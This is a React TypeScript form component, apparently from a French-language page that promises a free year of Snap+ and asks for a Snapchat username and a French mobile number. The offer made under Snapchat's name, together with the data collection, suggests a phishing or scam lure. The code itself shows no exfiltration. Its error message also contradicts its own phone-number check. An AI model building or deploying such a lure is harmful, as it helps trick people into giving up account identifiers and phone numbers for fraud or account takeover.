import { useState } from "react";

interface SnapFormProps {
  onSubmit: (data: { username: string; phone: string }) => void;
}

const SnapForm = ({ onSubmit }: SnapFormProps) => {
  const [username, setUsername] = useState("");
  const [phone, setPhone] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!username.trim()) {
      setError("Veuillez entrer un nom d'utilisateur");
      return;
    }

    const phoneClean = phone.replace(/\s/g, "");
    if (!/^0[67]\d{8}$/.test(phoneClean)) {
      setError("Le numéro doit commencer par 06, 07, 6 ou 7 et contenir 9 ou 10 chiffres.");
      return;
    }

    onSubmit({ username, phone: phoneClean });
  };

  return (
    <form onSubmit={handleSubmit} className="w-full max-w-md space-y-4">
      <h2 className="text-center text-lg font-medium text-foreground mb-6">
        Active Snap+ gratuitement pendant 1 an !
      </h2>

      <div className="relative">
        <input
          type="text"
          placeholder="Nom d'utilisateur Snapchat"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="gold-input w-full"
        />
      </div>

      <div className="gold-input flex p-0 overflow-hidden focus-within:border-[hsl(45,90%,50%)] focus-within:shadow-[0_0_0_1px_hsl(45,90%,50%),0_0_20px_hsla(45,90%,50%,0.15)]">
        <div className="flex items-center gap-2 px-4 border-r border-border">
          <span className="text-lg">🇫🇷</span>
          <span className="text-muted-foreground font-medium">+33</span>
        </div>
        <input
          type="tel"
          placeholder="Numéro de téléphone"
          value={phone}
          onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 10))}
          maxLength={10}
          className="flex-1 bg-transparent px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none"
        />
      </div>

      {error && (
        <p className="text-sm text-error">{error}</p>
      )}

      <button type="submit" className="gold-button w-full mt-6">
        Continuer
      </button>
    </form>
  );
};

export default SnapForm;
